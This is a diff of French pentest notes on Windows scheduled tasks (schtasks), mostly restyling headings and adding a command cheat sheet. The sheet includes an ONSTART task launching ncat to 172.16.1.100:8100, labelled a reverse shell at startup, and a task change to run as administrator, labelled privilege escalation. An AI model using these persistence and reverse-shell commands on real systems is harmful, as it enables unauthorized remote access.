@@ -1,4 +1,4 @@
-# Page 1
+# Scheduled Tasks (Windows)
 
 ## <mark style="color:red;">Scheduled Tasks (Windows)</mark>
 
@@ -64,7 +64,7 @@ Une tâche peut se lancer :
 
 ## <mark style="color:red;">📋 PARTIE 1 – Lister les tâches existantes</mark>
 
-### 🔹 Syntaxe générale
+### <mark style="color:blue;">🔹 Syntaxe générale</mark>
 
 ```cmd
 schtasks /query [options]
@@ -108,7 +108,7 @@ Run As User: tru7h
 Schedule Type: At system start up
 ```
 
-#### 🔍 Interprétation
+#### <mark style="color:green;">🔍 Interprétation</mark>
 
 | Champ         | Signification            |
 | ------------- | ------------------------ |
@@ -159,7 +159,7 @@ schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\L
 ```
 {% endcode %}
 
-#### 🔍 Analyse
+#### <mark style="color:green;">🔍 Analyse</mark>
 
 | Élément  | Explication       |
 | -------- | ----------------- |
@@ -171,7 +171,7 @@ schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\L
 
 ***
 
-### 📤 Sortie
+### <mark style="color:green;">📤 Sortie</mark>
 
 ```
 SUCCESS: The scheduled task "My Secret Task" has successfully been created.
@@ -247,7 +247,7 @@ schtasks /run /tn "My Secret Task"
 
 ## <mark style="color:red;">❌ PARTIE 5 – Supprimer une tâche</mark>
 
-### 🔹 Syntaxe
+### <mark style="color:green;">🔹 Syntaxe</mark>
 
 ```cmd
 schtasks /delete /tn <nom>
@@ -255,7 +255,7 @@ schtasks /delete /tn <nom>
 
 ***
 
-### Exemple
+### <mark style="color:green;">Exemple</mark>
 
 ```cmd
 schtasks /delete /tn "My Secret Task"
@@ -290,3 +290,34 @@ schtasks /delete /tn "My Secret Task" /f
 | Delete | Nettoyage   |
 
 ***
+
+| Commande                                                                                    | Description                                                 |
+| ------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
+| `schtasks /query`                                                                           | Lister les tâches planifiées                                |
+| `schtasks /query /v /fo list`                                                               | Lister les tâches en mode verbeux (recommandé pentest)      |
+| `schtasks /query /tn "My Secret Task" /v /fo list`                                          | Vérifier une tâche spécifique en détail                     |
+| `schtasks /create /sc <schedule> /tn <nom> /tr <commande>`                                  | Créer une tâche planifiée (syntaxe minimale)                |
+| `schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\...\ncat.exe 172.16.1.100 8100"` | Créer un reverse shell au démarrage                         |
+| `schtasks /change /tn <nom>`                                                                | Modifier une tâche existante (syntaxe de base)              |
+| `schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"`                    | Changer l'utilisateur d'exécution (élévation de privilèges) |
+| `schtasks /run /tn "My Secret Task"`                                                        | Lancer manuellement une tâche                               |
+| `schtasks /delete /tn "My Secret Task"`                                                     | Supprimer une tâche (avec confirmation)                     |
+| `schtasks /delete /tn "My Secret Task" /f`                                                  | Supprimer une tâche sans confirmation                       |
+
+***
+
+**Rappel des paramètres clés :**
+
+| Paramètre | Rôle                                                     |
+| --------- | -------------------------------------------------------- |
+| `/fo`     | Format d'affichage : `TABLE`, `LIST`, `CSV`              |
+| `/v`      | Mode verbeux                                             |
+| `/sc`     | Type de planification (`ONSTART`, `ONLOGON`, `DAILY`...) |
+| `/tn`     | Nom de la tâche                                          |
+| `/tr`     | Commande à exécuter                                      |
+| `/ru`     | Utilisateur d'exécution                                  |
+| `/rp`     | Mot de passe de l'utilisateur                            |
+| `/rl`     | Niveau de privilèges                                     |
+| `/f`      | Force (sans confirmation)                                |
+| `/z`      | Auto-suppression après exécution                         |
+| `/s`      | Machine distante                                         |
